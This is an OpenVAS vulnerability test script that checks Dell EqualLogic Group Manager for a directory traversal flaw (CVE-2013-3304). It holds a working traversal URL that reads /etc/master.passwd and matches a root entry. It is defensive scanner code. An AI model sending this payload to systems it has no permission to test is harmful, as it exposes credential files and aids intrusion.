###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_dell_EqualLogic_70760.nasl 11867 2018-10-12 10:48:11Z cfischer $
#
# Dell EqualLogic Directory Traversal Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2014 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.105100");
  script_bugtraq_id(70760);
  script_cve_id("CVE-2013-3304");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_version("$Revision: 11867 $");

  script_name("Dell EqualLogic Directory Traversal Vulnerability");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/70760");
  script_xref(name:"URL", value:"http://dell.com");

  script_tag(name:"impact", value:"Exploiting this issue can allow an attacker to gain access to
arbitrary system files. Information harvested may aid in launching further attacks.");

  script_tag(name:"vuldetect", value:"Send a special crafted HTTP GET request and check the response.");
  script_tag(name:"insight", value:"Dell EqualLogicis fails to sufficiently sanitize user-supplied input.");
  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");
  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"summary", value:"Dell EqualLogicis prone to a directory-traversal vulnerability.");

  script_tag(name:"affected", value:"Dell EqualLogic Firmware versions 6.0 is vulnerable. Other versions
may also be affected.");

  script_tag(name:"last_modification", value:"$Date: 2018-10-12 12:48:11 +0200 (Fri, 12 Oct 2018) $");
  script_tag(name:"creation_date", value:"2014-10-29 13:15:11 +0100 (Wed, 29 Oct 2014)");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2014 Greenbone Networks GmbH");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");


  exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

port = get_http_port( default:80 );

if( http_vuln_check( port:port, url:"/", pattern:"<title>.*EqualLogic.*Group Manager</title>", usecache:TRUE ) )
{
  url = '//../../../../../../../../etc/master.passwd';

  if( http_vuln_check( port:port, url:url, pattern:"root:.*:0:[01]:" ) )
  {
    report = report_vuln_url( port:port, url:url );
    security_message( port:port, data:report );
    exit( 0 );
  }
  exit( 99 );
}

exit(0);
